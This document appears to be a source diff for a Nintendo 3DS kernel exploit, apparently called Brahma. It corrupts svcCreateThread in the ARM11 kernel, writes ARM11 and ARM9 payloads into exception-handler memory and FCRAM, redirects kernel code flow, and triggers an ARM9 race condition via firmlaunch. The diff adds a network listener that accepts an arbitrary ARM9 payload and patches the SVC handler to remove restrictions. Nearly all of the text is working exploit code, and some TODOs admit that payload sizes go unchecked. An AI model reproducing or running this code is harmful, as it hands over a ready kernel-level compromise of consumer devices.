@@ -4,20 +4,26 @@
 #include <string.h>
 #include <malloc.h>
 #include <dirent.h>
+#include <sys/socket.h>
+#include <sys/_default_fcntl.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include "brahma.h"
-#include "sysdep.h"
+#include "exploitdata.h"
+
 
 // some ugly global vars
+struct exploit_data g_expdata;
+struct arm11_shared_data g_arm11shared;
 
-struct exploit_data ed;
-struct arm11_shared_data arm11shared;
-
-u8 sd_arm9_buf[1024 * 1000];
-u32 sd_arm9_size = 0;
-s32 sd_arm9_loaded = 0;
-
-u8 is_healed_svc_handler = 0;
-
+/* TODO: replace with heap buffers and
+   properly limit maximum size of payload
+   so we won't write beyond FCRAM */
+u8  g_ext_arm9_buf[ARM9_PAYLOAD_MAX_SIZE];
+u32 g_ext_arm9_size = 0;
+s32 g_ext_arm9_loaded = 0;
+u8  g_is_healed_svc_handler = 0;
+s32 g_do_patch_svc = 0;
 
 /* overwrites two instructions (8 bytes in total) at src_addr
    with code that redirects execution to dst_addr */ 
@@ -141,17 +147,17 @@ int corrupt_arm11_kernel_code(void) {
 	int result = 0;
 	
 	// get system dependent data required for the exploit		
-	if (get_exploit_data(&ed)) {
+	if (get_exploit_data(&g_expdata)) {
 		
 		/* prepare system-dependant data required by
 		the exploit's ARM11 kernel code */
 		
-		arm11shared.va_hook1_ret = ed.va_hook1_ret;
-		arm11shared.va_pdn_regs = ed.va_pdn_regs;
-		arm11shared.va_pxi_regs = ed.va_pxi_regs;
+		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
+		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
+		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
 	
 		// corrupt certain parts of the svcCreateThread() kernel code
-		priv_write_four(ed.va_patch_createthread);
+		priv_write_four(g_expdata.va_patch_createthread);
 	
 		// clear icache from "userland"
 		user_clear_icache();
@@ -161,33 +167,109 @@ int corrupt_arm11_kernel_code(void) {
 	return result;
 }
 
+/* TODO: experimental, network code might be moved somewhere else */
+int recv_arm9_payload() {
+	int sockfd;
+	struct sockaddr_in sa;
+	int ret;
+	u32 kDown, old_kDown;
+		
+	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+		printf("[!] Error: socket()\n");
+		return 1;
+	}
+
+	bzero(&sa, sizeof(sa));
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(BRAHMA_NETWORK_PORT);
+	sa.sin_addr.s_addr = gethostid();
+
+    if (bind(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
+		printf("[!] Error: bind()\n");
+		close(sockfd);
+		return 1;
+	}
+
+	if (listen(sockfd, 1) != 0) {
+		printf("[!] Error: listen()\n");
+		close(sockfd);
+		return 1;
+	}
+
+	printf("[x] IP %s:%d\n", inet_ntoa(sa.sin_addr), BRAHMA_NETWORK_PORT);
+
+	int clientfd;
+	struct sockaddr_in client_addr;
+	int addrlen = sizeof(client_addr);
+
+	fcntl(sockfd, F_SETFL, O_NONBLOCK);
+
+	hidScanInput();
+	old_kDown = hidKeysDown();
+	while (1) {
+		hidScanInput();
+		kDown = hidKeysDown();
+		if (kDown != old_kDown) {
+			printf("[!] Aborted\n");
+			close(sockfd);
+			return 1;
+		}
+
+		clientfd = accept(sockfd, (struct sockaddr*)&client_addr, &addrlen);
+		svcSleepThread(100000000);
+		if (clientfd > 0)
+			break;
+	}
+
+	printf("[x] Connection from %s:%d\n\n", inet_ntoa(client_addr.sin_addr),
+		ntohs(client_addr.sin_port));
+
+	g_ext_arm9_size = 0;
+	g_ext_arm9_loaded = 0;
+	
+	int recvd;
+	int total = 0;
+	int remsize = ARM9_PAYLOAD_MAX_SIZE;
+	u8 *dst = &g_ext_arm9_buf;
+	while ((recvd = recv(clientfd, dst + total, remsize - total, 0)) != 0) {
+		if (recvd != -1) {
+			total += recvd;
+			printf(".");
+			g_ext_arm9_size += recvd;
+		}
+	}
+	printf("\n\n[x] Received %d bytes in total\n", total);
+	g_ext_arm9_loaded = (g_ext_arm9_size != 0);
+
+	close(clientfd);
+	close(sockfd);
+
+	return 1;
+}
+
 /* reads ARM9 payload from a given path.
    filename - full path of payload
    buf - ptr to a global buffer that will hold the entire payload
    buf_size - size of the 'buf' variable
    out_size - will contain the payload's actual size
 
-   returns: 0 on failure, 1 on success
-   
-   payload must be aligned to a 4 byte boundary and >= 8 bytes in total */
-int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
+   returns: 0 on failure, 1 on success */
+int load_arm9_payload(char *filename) {
 	int result = 0;
-	u32 fsize = 0;
+	s32 fsize = 0;
 	
-	if ((!filename) || (!buf) || (!buf_size) || (!out_size))
+	if (!filename)
 		return result; 
 	
 	FILE *f = fopen(filename, "rb");
 	if (f) {
 		fseek(f , 0, SEEK_END);
 		fsize = ftell(f);
+		g_ext_arm9_size = fsize;
 		rewind(f);
-		if (fsize >= 8 && !(fsize % 4) && (fsize < buf_size)) {
-				u32 bytes_read = fread(buf, 1, fsize, f);
-				if (bytes_read == fsize) {
-					*out_size = fsize;
-					result = 1;
-				}
+		if (fsize >= 8 && (fsize < ARM9_PAYLOAD_MAX_SIZE)) {
+				u32 bytes_read = fread(&g_ext_arm9_buf, 1, fsize, f);
+				result = (g_ext_arm9_loaded = (bytes_read == fsize));
 		}
 		fclose(f);
 	}
@@ -202,98 +284,129 @@ int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
 	 - a branch instruction at offset 0 and
 	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
 int map_arm9_payload(void) {
-	extern u32 arm9_start[];
-	extern u32 arm9_end[];
 
-	u32 *src, *src_end;
+	extern void *arm9_start;
+	extern void *arm9_end;
+
+	void *src;
+	volatile void *dst;
 	
-	if (!sd_arm9_loaded) {
-		src = arm9_start;
-		src_end = arm9_end;
+	s32 size = 0;
+	s32 result = 0;
+
+	dst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
+	
+	if (!g_ext_arm9_loaded) {
+		// defaul ARM9 payload
+		src = &arm9_start;
+		size = (u8 *)&arm9_end - (u8 *)&arm9_start;
 	}
 	else {
-		src = sd_arm9_buf;
-		src_end = sd_arm9_buf + sd_arm9_size;
+		// external ARM9 payload
+		src = &g_ext_arm9_buf;
+		size = g_ext_arm9_size;
 	}
 	
-	u32 *dst = (u32 *)(ed.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
-	while (src != src_end) {
-		*dst = *src;
-		src++;
-		dst++;				
-	}	
+	// TODO: properly sanitize 'size' (must not overflow fcram)
+	if (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {
+		memcpy(dst, src, size);
+		result = 1;
+	}
+	
+	return result;
+}
+
+int map_arm11_payload(void) {
+
+	extern void *arm11_start;
+	extern void *arm11_end;
+	
+	void *src;
+	volatile void *dst;
+	s32 size = 0;
+	u32 offs;
+	int result_a = 0;
+	int result_b = 0;
+
+	src = &arm11_start;
+	dst = (void *)(g_expdata.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
+	size = (u8 *)&arm11_end - (u8 *)&arm11_start;
+	
+	// TODO: sanitize 'size' 
+	if (size) {
+		memcpy(dst, src, size);
+		result_a = 1;
+	}
+
+	offs = size;
+	src = &g_arm11shared;
+	size = sizeof(g_arm11shared);
+	
+	dst = (u8 *)(g_expdata.va_exc_handler_base_W +
+	      OFFS_EXC_HANDLER_UNUSED + offs);
+
+	// TODO sanitize 'size'
+	if (result_a && size) {
+		memcpy(dst, src, size);
+		result_b = 1;
+	}
+
+	return result_a & result_b;
 }
 
 void exploit_arm9_race_condition() {
-	u32 *src, *dst;
-	extern u32 arm11_start[];
-	extern u32 arm11_end[];
-	extern u32 arm11_globals_start[];
-	extern u32 arm11_globals_end[];
 
-	int (* const _KernelSetState)(int, int, int, int) = (void *)ed.va_kernelsetstate;
+	int (* const _KernelSetState)(int, int, int, int) =
+	    (void *)g_expdata.va_kernelsetstate;
 	
 	asm volatile ("clrex");
 
-	/* copy ARM11 payload to lower, writable mirror of
-	   mapped exception handlers */
-	dst = (u32 *)(ed.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
-	for (src = arm11_start; src != arm11_end;) {
-		*dst = *src;
-		dst++;
-		src++;		
-	}
+	/* copy ARM11 payload and console specific data */
+	if (map_arm11_payload() &&
+		/* copy ARM9 payload to FCRAM */
+		map_arm9_payload()) {
 
-	/* copy firmware- and console specific data */
-	dst = (u32 *)(ed.va_exc_handler_base_W + 
-	              OFFS_EXC_HANDLER_UNUSED +
-	              ((arm11_end-arm11_start)<<2));
-	for (src = &arm11shared; src != &arm11shared + 
-		sizeof(arm11shared) / sizeof(u32);) {
-			*dst = *src;
-			dst++;
-			src++;		
-	}
-
-	/* copy ARM9 payload to FCRAM */
-	map_arm9_payload();
-
-	/* patch ARM11 kernel to force it to execute
-	   our code (hook1 and hook2) as soon as a
-	   "firmlaunch" is triggered */ 	 
-	redirect_codeflow(ed.va_exc_handler_base_X +
-	                  OFFS_EXC_HANDLER_UNUSED,
-	                  ed.va_patch_hook1);
-
-	redirect_codeflow(PA_EXC_HANDLER_BASE +
-	                  OFFS_EXC_HANDLER_UNUSED + 4,
-	                  ed.va_patch_hook2);
+		/* patch ARM11 kernel to force it to execute
+		   our code (hook1 and hook2) as soon as a
+		   "firmlaunch" is triggered */ 	 
+		redirect_codeflow(g_expdata.va_exc_handler_base_X +
+		                  OFFS_EXC_HANDLER_UNUSED,
+		                  g_expdata.va_patch_hook1);
 	
-	CleanEntireDataCache();
-	InvalidateEntireInstructionCache();
+		redirect_codeflow(PA_EXC_HANDLER_BASE +
+		                  OFFS_EXC_HANDLER_UNUSED + 4,
+		                  g_expdata.va_patch_hook2);
 
-	// trigger ARM9 code execution through "firmlaunch"
-	_KernelSetState(0, 0, 2, 0);	
+		CleanEntireDataCache();
+		InvalidateEntireInstructionCache();
+
+		// trigger ARM9 code execution through "firmlaunch"
+		_KernelSetState(0, 0, 2, 0);		
+		// prev call shouldn't ever return
+	}
+	return;
 }
 
 /* - restores corrupted code of CreateThread() syscall
    - if heal_svc_handler is true, a patch to the ARM11
      Kernel's syscall handler is applied in order to
-     remove a certain restriction. */
-apply_patches (bool heal_svc_handler) {
+     remove a certain restriction. This is not really
+	 required since we're going to acquire ARM9 svc
+	 privileges.*/
+void apply_patches (bool heal_svc_handler) {
 	asm volatile ("clrex");
 	
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();	
 
 	// repair CreateThread()
-	*(int *)(ed.va_patch_createthread) = 0x8DD00CE5;
+	*(int *)(g_expdata.va_patch_createthread) = 0x8DD00CE5;
 			
 	// heal svc handler (patch it to allow access to restricted SVCs) 
-	if(heal_svc_handler && ed.va_patch_svc_handler > 0) {
-		*(int *)(ed.va_patch_svc_handler) = ARM_NOP;
-		*(int *)(ed.va_patch_svc_handler+8) = ARM_NOP;
-		is_healed_svc_handler = 1;
+	if(heal_svc_handler && g_expdata.va_patch_svc_handler > 0) {
+		*(int *)(g_expdata.va_patch_svc_handler) = ARM_NOP;
+		*(int *)(g_expdata.va_patch_svc_handler+8) = ARM_NOP;
+		g_is_healed_svc_handler = 1;
 	}
 
 	CleanEntireDataCache();
@@ -307,7 +420,7 @@ launch_privileged_code (void) {
 	asm volatile ("add sp, sp, #8\t\n");
 	
 	// repair CreateThread() but don't patch SVC handler
-	apply_patches (false);
+	apply_patches(g_do_patch_svc);
 	// acquire ARM9 code execution privileges
 	exploit_arm9_race_condition();
 	
@@ -315,36 +428,21 @@ launch_privileged_code (void) {
 			 "ldr pc, [sp], #4\t\n");
 }
 
-int run_exploit() {
+int run_exploit(int svc_patch) {
 
-	user_clear_icache();
+	int fail_stage = 0;
+	g_do_patch_svc = svc_patch;
+	//user_clear_icache();
 
-	printf("* BRAHMA *\n\n");	
-	printf("[+] Getting ARM11 kernel privileges\n");
+	/* 3DS and/or firmware not supported, ARM11 exploit failure */
+	fail_stage++;
 	
 	if(corrupt_arm11_kernel_code ()) {
-	
-		// if present in SD root, load arm9payload.bin 
-		sd_arm9_loaded = load_arm9_payload("/arm9payload.bin",
-		                                   &sd_arm9_buf,
-		                                   sizeof(sd_arm9_buf),
-		                                   &sd_arm9_size);
-		printf("[+] Loaded %s ARM9 payload\n",
-				sd_arm9_loaded ? "external" : "built-in");
-		
-		printf("[+] Running payload\n");	
-		svcCorruptedCreateThread(launch_privileged_code);			
-		printf("[!] Failure\n");
-		
-		if(is_healed_svc_handler) {
-			/* if exploiting the ARM9 race condition did not
-			   succeed but the ARM11 kernel's SVC handler has been
-			   patched, we might still execute privileged ARM11 code
-			   in kernel mode, here */
-		}
+		/* Firmlaunch failure, ARM9 exploit failure*/
+		fail_stage++;
+		svcCorruptedCreateThread(launch_privileged_code);
 	}
-	else
-		printf("[!] 3DS model/firmware not yet supported\n");
 
-	return 0;
+	/* we do not intend to return ... */
+	return fail_stage;
 }
